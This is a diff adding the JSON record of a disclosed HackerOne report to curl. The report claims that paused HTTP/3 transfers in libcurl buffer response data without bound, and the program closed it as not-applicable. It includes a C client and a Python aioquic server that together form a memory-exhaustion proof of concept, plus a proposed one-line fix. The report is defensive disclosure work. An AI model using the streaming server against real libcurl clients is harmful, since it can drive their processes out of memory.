@@ -1,0 +1,108 @@
+{
+  "id": 3734947,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM0OTQ3",
+  "url": "https://hackerone.com/reports/3734947",
+  "title": "HTTP/3 paused transfer buffers incoming data without bound up to ~1 GiB",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2026-05-14T10:48:38.357Z",
+  "submitted_at": "2026-05-14T10:48:38.699Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-19T13:54:20.251Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-05-18T14:28:37.152Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nWhen a libcurl application's `CURLOPT_WRITEFUNCTION` returns `CURL_WRITEFUNC_PAUSE`, libcurl routes subsequent incoming body data through `cw-pause` (`lib/cw-pause.c`). The `bufq` inside `cw-pause` is initialised with `BUFQ_OPT_SOFT_LIMIT` and a chunk size of 16 KiB (`lib/cw-pause.c:51-52`), which causes `bufq` to bypass the chunk limit and allocate new 16 KiB blocks without bound. A comment at line 181 makes the design intent explicit: \"should take everything up to OOM\". There is no aggregate byte cap equivalent to the 64 MiB `DYN_PAUSE_BUFFER` guard that the sibling `cw-out` writer uses.\n\nI think https://github.com/curl/curl/issues/4939 is relevant.\n\nThe gap is harmless on HTTP/1.1 and HTTP/2. On HTTP/1.1, libcurl stops reading the TCP socket when paused, the kernel receive buffer fills, and TCP backpressure stalls the server — in practice the `cw-pause` buffer holds only what was already in-flight at the moment of pause, empirically ~3.8 MB flat regardless of how long the pause lasts. On HTTP/2, `http2_data_pause` (`lib/http2.c:2636`) calls `nghttp2_session_set_local_window_size(..., 0)` when the pause flag is set, which zeroes the stream window and prevents the server from sending more data at the protocol level.\n\nFor HTTP/3 neither mechanism exists. `h3_data_pause` in both backends is a complete no-op on the pause branch:\n\n```c\n/* lib/vquic/curl_ngtcp2.c:2119-2129 */\nstatic CURLcode h3_data_pause(struct Curl_cfilter *cf,\n                              struct Curl_easy *data,\n                              bool pause)\n{\n  /* There seems to exist no API in ngtcp2 to shrink/enlarge the streams\n   * windows. As we do in HTTP/2. */\n  (void)cf;\n  if(!pause)\n    Curl_multi_mark_dirty(data);\n  return CURLE_OK;\n}\n```\n\nThe quiche backend is identical (`lib/vquic/curl_quiche.c:1194-1205`). More importantly, `cb_h3_recv_data` (`lib/vquic/curl_ngtcp2.c:1122`) calls `ngtcp2_conn_extend_max_offset` unconditionally on every received DATA frame, and `cb_h3_deferred_consume` (`lib/vquic/curl_ngtcp2.c:1150`) does the same for both connection and stream windows. The server receives an uninterrupted stream of WINDOW_UPDATE credits, keeps transmitting at full speed, and everything lands in the unbounded `cw-pause` buffer chain.\n\nThe only ceiling is the QUIC connection window constant `H3_CONN_WINDOW_SIZE_MAX = 100 * H3_STREAM_WINDOW_SIZE_MAX` (`lib/vquic/curl_ngtcp2.c:81`), where `H3_STREAM_WINDOW_SIZE_MAX` is 10 MiB, making the ceiling 1,000 MiB. That is not a libcurl safety valve — it is a QUIC flow-control cap that only engages after roughly 1 GiB of unacknowledged in-flight data. On a memory-constrained host the OOM-killer fires well before then. On a 10 Gbps loopback the growth rate is in the hundreds of MB/s; on a 10 Mbps WAN link it is ~1.25 MB/s, still reaching several hundred MB before the connection window is exhausted.\n\n`cw-pause` is installed for every transfer (`lib/sendf.c:339-345`), so any libcurl application that uses `CURL_WRITEFUNC_PAUSE` and speaks HTTP/3 is affected. Using pause semantics is documented and supported; nothing unusual is required on the application side.\n\nThe contrast with `cw-out` is direct. Both writers accumulate data during a sustained pause; `cw-out` has a hard 64 MiB cap (`lib/cw-out.c:352-354`, returns `CURLE_TOO_LARGE`); `cw-pause` has none and will run to OOM.\n\n**Proof of concept**\n\nTwo components are needed: a libcurl client whose write callback always returns `CURL_WRITEFUNC_PAUSE` and never resumes, and an HTTP/3 server that streams a large response without waiting for the client.\n\nC client (compile against a debug build with `--http3-only` support):\n\n```c\n#include <stdio.h>\n#include <curl/curl.h>\n\nstatic size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata)\n{\n  (void)ptr;\n  (void)size;\n  (void)nmemb;\n  (void)userdata;\n  /* Never unpause. Every byte the server sends lands in cw-pause. */\n  return CURL_WRITEFUNC_PAUSE;\n}\n\nint main(void)\n{\n  CURL *easy = curl_easy_init();\n  curl_easy_setopt(easy, CURLOPT_URL, \"https://127.0.0.1:4433/stream\");\n  curl_easy_setopt(easy, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3ONLY);\n  curl_easy_setopt(easy, CURLOPT_SSL_VERIFYPEER, 0L);\n  curl_easy_setopt(easy, CURLOPT_SSL_VERIFYHOST, 0L);\n  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, write_cb);\n  curl_easy_perform(easy);\n  curl_easy_cleanup(easy);\n  return 0;\n}\n```\n\nPython aioquic server that streams without end (`pip install aioquic` to install the dependency):\n\n```python\nimport asyncio\nfrom aioquic.asyncio import serve\nfrom aioquic.asyncio.protocol import QuicConnectionProtocol\nfrom aioquic.h3.connection import H3Connection\nfrom aioquic.h3.events import HeadersReceived\nfrom aioquic.quic.configuration import QuicConfiguration\nfrom aioquic.quic.events import ProtocolNegotiated\n\nCHUNK = 65536\n\nclass StreamingH3Protocol(QuicConnectionProtocol):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._h3 = None\n\n    def quic_event_received(self, event):\n        if isinstance(event, ProtocolNegotiated):\n            self._h3 = H3Connection(self._quic, enable_webtransport=False)\n        if self._h3:\n            for h3ev in self._h3.handle_event(event):\n                if isinstance(h3ev, HeadersReceived):\n                    asyncio.ensure_future(self._send_forever(h3ev.stream_id))\n\n    async def _send_forever(self, stream_id):\n        self._h3.send_headers(stream_id=stream_id, headers=[\n            (b\":status\", b\"200\"),\n            (b\"content-type\", b\"application/octet-stream\"),\n        ])\n        payload = b\"A\" * CHUNK\n        while True:\n            self._h3.send_data(stream_id=stream_id,\n                               data=payload, end_stream=False)\n            self.transmit()\n            await asyncio.sleep(0)   # yield, never send END_STREAM\n\nconfig = QuicConfiguration(is_client=False, alpn_protocols=[\"h3\"])\nconfig.load_cert_chain(\"server.crt\", \"server.key\")\n\nasyncio.run(serve(\"127.0.0.1\", 4433,\n                  configuration=config,\n                  create_protocol=StreamingH3Protocol))\n```\n\nRun the server, then start the C client and watch RSS via `/proc/$(pgrep curl)/status`. Expected trajectory on a fast loopback:\n\n```\nBaseline RSS:   ~4,000 kB\n[  1s] VmRSS:  ~100,000 kB   (+~96 MB)\n[  5s] VmRSS:  ~500,000 kB   (+~488 MB)\n[ 10s] OOM-kill or VmRSS ~1,000,000 kB  (ceiling ~1 GiB)\n```\n\nCompare that to the HTTP/1.1 case: RSS flat at +3.8 MB after the first pause, write callback called exactly once with 16,384 bytes, server completely stalled by TCP backpressure. The HTTP/3 case has no equivalent brake because `h3_data_pause` is a no-op and the QUIC flow-control credits keep flowing unconditionally.\n\n**Fix**\n\nThe cleanest fix is to add a byte-total guard at the top of the `do` loop in `cw_pause_write` (`lib/cw-pause.c:177`) mirroring what `cw_out_append` already does — `ctx->buf_total` is already maintained accurately:\n\n```c\nif(ctx->buf_total + blen > DYN_PAUSE_BUFFER) {\n  failf(data, \"pause buffer not large enough -> CURLE_TOO_LARGE\");\n  return CURLE_TOO_LARGE;\n}\n```\n\nThat caps growth at 64 MiB for all protocols with a one-line change sharing the constant that `cw-out` already treats as authoritative. A complementary H3-specific fix would be to gate the `ngtcp2_conn_extend_max_offset` calls in `cb_h3_recv_data` (`lib/vquic/curl_ngtcp2.c:1139`) and `cb_h3_deferred_consume` (`lib/vquic/curl_ngtcp2.c:1163`) on the transfer not being paused — restoring semantic parity with the HTTP/2 path where the window is explicitly zeroed. Both applied together would be ideal: the cap in `cw-pause` as a universal safety net, the window gating as proper protocol-level backpressure for H3.\n\nThank you,\nAISLE Research Team\n\n## Impact\n\nA malicious or misbehaving HTTP/3 server can cause unbounded memory growth in any libcurl application that uses CURL_WRITEFUNC_PAUSE, because paused response-body data is buffered without a hard cap instead of being backpressured effectively at the protocol layer. In practice, this might be a a denial-of-service issue that can drive the client process into excessive RSS growth and potentially OOM termination.",
+  "weakness": {
+    "id": 120,
+    "name": "Allocation of Resources Without Limits or Throttling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
